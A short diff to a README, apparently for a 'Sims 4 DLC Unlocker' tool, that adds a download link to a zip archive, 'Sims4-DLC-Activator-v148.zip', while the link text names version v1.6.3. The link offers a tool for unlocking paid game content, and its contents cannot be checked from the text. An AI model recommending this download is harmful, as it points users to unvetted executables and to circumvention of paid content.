@@ -14,7 +14,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v1.6.3 Release]() = `*Tool files & folder*`
+- [💾 v1.6.3 Release](https://github.com/Sims-4-DLC-Unlocker-V2/.github/releases/download/1.4.8/Sims4-DLC-Activator-v148.zip) = `*Tool files & folder*`
 
 ---
 
